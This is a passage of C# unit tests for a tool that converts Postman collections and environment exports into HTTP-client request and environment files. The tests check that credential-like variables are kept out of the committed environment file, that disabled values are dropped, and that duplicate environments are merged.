    public void A_collections_own_variables_become_the_shared_environment()
    {
        var result = Import(Collection("Acme", """
            { "name": "Ping", "request": "{{base_url}}/ping" }
            """, variables: """
            "variable": [
              { "key": "base_url", "value": "https://api.example.com" },
              { "key": "api_token", "value": "t-12345" }
            ],
            """));

        var committed = File(result, "http-client.env.json").Text;
        var secrets = File(result, "http-client.private.env.json").Text;

        Assert.Contains("\"$shared\"", committed, StringComparison.Ordinal);
        Assert.Contains("https://api.example.com", committed, StringComparison.Ordinal);

        // 'api_token' reads as a credential whatever Postman labelled it.
        Assert.Contains("t-12345", secrets, StringComparison.Ordinal);
        Assert.DoesNotContain("t-12345", committed, StringComparison.Ordinal);
    }

    /// <summary>
    /// A collection alone is full of <c>{{base_url}}</c> references whose values live in the
    /// environment export, so the two are imported together.
    /// </summary>
    [Fact]
    public void An_environment_export_becomes_an_environment()
    {
        var result = PostmanImport.Convert(
        [
            new PostmanSource("Acme.postman_collection.json", Collection("Acme", """
                { "name": "Ping", "request": "{{base_url}}/ping" }
                """)),
            new PostmanSource("Staging.postman_environment.json", """
                {
                  "name": "staging",
                  "values": [
                    { "key": "base_url", "value": "https://staging.example.com", "enabled": true },
                    { "key": "access_token", "value": "st-secret", "type": "secret", "enabled": true },
                    { "key": "legacy_url", "value": "https://old.example.com", "enabled": false }
                  ]
                }
                """),
        ]);

        var committed = File(result, "http-client.env.json").Text;
        var secrets = File(result, "http-client.private.env.json").Text;

        Assert.Contains("\"staging\"", committed, StringComparison.Ordinal);
        Assert.Contains("https://staging.example.com", committed, StringComparison.Ordinal);
        Assert.Contains("st-secret", secrets, StringComparison.Ordinal);

        // Switched off in Postman means switched off here - a disabled value is very often a
        // stale token, and resurrecting one is a confusing way to be wrong.
        Assert.DoesNotContain("old.example.com", committed, StringComparison.Ordinal);
    }

    /// <summary>
    /// Postman only marks a value secret when its owner ticked the box, and most do not - so
    /// the label alone would put a live token in the file destined for a commit.
    /// </summary>
    [Theory]
    [InlineData("access_token", true)]
    [InlineData("clientSecret", true)]
    [InlineData("database_password", true)]
    [InlineData("X-Api-Key", true)]
    // The short names are the common ones, and a substring list missed every one of them.
    [InlineData("key", true)]
    [InlineData("apiKey", true)]
    [InlineData("pass", true)]
    [InlineData("pwd", true)]
    [InlineData("jwt", true)]
    [InlineData("pat", true)]
    // …and a whole-word rule must not claim the words that merely contain them.
    [InlineData("keyword", false)]
    [InlineData("path", false)]
    [InlineData("passenger_id", false)]
    [InlineData("base_url", false)]
    [InlineData("auth_url", false)]
    [InlineData("token_endpoint", false)]
    [InlineData("page_size", false)]
    public void A_name_that_reads_like_a_credential_is_treated_as_one(string key, bool secret)
    {
        var result = PostmanImport.Convert(
        [
            new PostmanSource("c.json", Collection("Acme", """
                { "name": "Ping", "request": "https://x.example.com/p" }
                """)),
            new PostmanSource("e.json", $$"""
                { "name": "dev", "values": [ { "key": {{Quote(key)}}, "value": "the-value" } ] }
                """),
        ]);

        var landedIn = secret ? "http-client.private.env.json" : "http-client.env.json";

        Assert.Contains("the-value", File(result, landedIn).Text, StringComparison.Ordinal);
    }

    /// <summary>
    /// Selecting two exports with the same name is one dialog action away - two workspaces,
    /// or a re-export beside the original. Assigning would have dropped the first entirely
    /// and said nothing about it.
    /// </summary>
    [Fact]
    public void Two_environments_with_the_same_name_are_merged_and_the_collision_is_reported()
    {
        var result = PostmanImport.Convert(
        [
            new PostmanSource("c.json", Collection("Acme", """
                { "name": "Ping", "request": "https://x.example.com/p" }
                """)),
            new PostmanSource("a.json", """
                { "name": "Production", "values": [ { "key": "a", "value": "first" }, { "key": "only_here", "value": "kept" } ] }
                """),
            new PostmanSource("b.json", """
                { "name": "Production", "values": [ { "key": "a", "value": "second" } ] }
                """),
        ]);

        var committed = File(result, "http-client.env.json").Text;

        Assert.Contains("kept", committed, StringComparison.Ordinal);
        Assert.Contains("second", committed, StringComparison.Ordinal);
        Assert.Contains(result.Notes, n => n.Contains("Two environments are called", StringComparison.Ordinal));
    }

    /// <summary>
    /// The normal shape of a real collection: every request lives in a folder, so the root
    /// document holds only the collection's description and its collection-level scripts,
    /// which is exactly the content a "write it only if it has a request" rule discarded.
    /// </summary>
    [Fact]
    public void A_collection_whose_requests_all_live_in_folders_still_keeps_its_own_documentation()
    {
        var result = PostmanImport.Convert("c.json", """
            {
              "info": {
                "name": "Acme",
                "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
                "description": "How to use this API."
              },
              "event": [
                { "listen": "prerequest", "script": { "exec": ["pm.environment.set('t', fetchToken());"] } }
              ],
              "item": [
                { "name": "Orders", "item": [ { "name": "List", "request": "https://x.example.com/o" } ] }
              ]
            }
            """);

        var root = File(result, "acme.http").Text;

        Assert.Contains("How to use this API.", root, StringComparison.Ordinal);
        Assert.Contains("pm.environment.set", root, StringComparison.Ordinal);
        Assert.Contains("orders.http", result.Files.Select(f => f.RelativePath), StringComparer.Ordinal);
    }

    /// <summary>
    /// …but the provenance header alone is not content. Otherwise every such collection would
    /// get a file holding two comment lines and nothing else.
    /// </summary>
    [Fact]
    public void A_collection_with_nothing_of_its_own_to_say_produces_no_root_file()
    {
        var result = Import(Collection("Acme", """
            { "name": "Orders", "item": [ { "name": "List", "request": "https://x.example.com/o" } ] }
            """));

        Assert.Equal(["orders.http"], result.Files.Select(f => f.RelativePath).ToArray());
    }

    [Fact]
    public void An_environment_with_no_name_falls_back_to_its_file_name()
    {
        var result = PostmanImport.Convert(
        [
            new PostmanSource("c.json", Collection("Acme", """
                { "name": "Ping", "request": "https://x.example.com/p" }
                """)),
            new PostmanSource("Production.postman_environment.json", """
                { "values": [ { "key": "region", "value": "eu" } ] }
                """),
        ]);

        Assert.Contains("\"Production\"", File(result, "http-client.env.json").Text, StringComparison.Ordinal);
    }

    [Fact]
    public void No_environment_file_is_produced_when_there_are_no_variables()
    {
        var result = Import(Collection("Acme", """
            { "name": "Ping", "request": "https://x.example.com/p" }
            """));

        Assert.DoesNotContain(result.Files, f => f.RelativePath.EndsWith(".json", StringComparison.Ordinal));
    }

    // ---- helpers -----------------------------------------------------------------------

    private static PostmanImportResult Import(string json) =>
        PostmanImport.Convert("collection.json", json);

    private static string Collection(
        string name,
        string items,
        string auth = "",
        string variables = "") =>
        $$"""
        {
          "info": { "name": {{Quote(name)}}, "schema": {{Quote(Schema)}} },
          {{auth}}
          {{variables}}
          "item": [ {{items}} ]
        }
        """;

    private static ImportedFile File(PostmanImportResult result, string path) =>
        Assert.Single(result.Files, f => string.Equals(f.RelativePath, path, StringComparison.Ordinal));

    private static RequestDocument Parse(ImportedFile file) => RequestDocumentParser.Parse(file.Text);

    /// <summary>Converts a one-request collection and gives back the parsed request.</summary>
    private static RequestBlock OneRequest(string item) =>
        Assert.Single(Parse(Assert.Single(Import(Collection("Acme", item)).Files)).Requests);

    /// <summary>JSON-quotes a value, so a fixture can hold a backslash or a control character.</summary>
    private static string Quote(string value) => System.Text.Json.JsonSerializer.Serialize(value);

    private static int Occurrences(string text, string needle)
    {
        var count = 0;

        for (var i = text.IndexOf(needle, StringComparison.Ordinal); i >= 0;
            i = text.IndexOf(needle, i + needle.Length, StringComparison.Ordinal))
        {
            count++;
        }

        return count;
    }
}
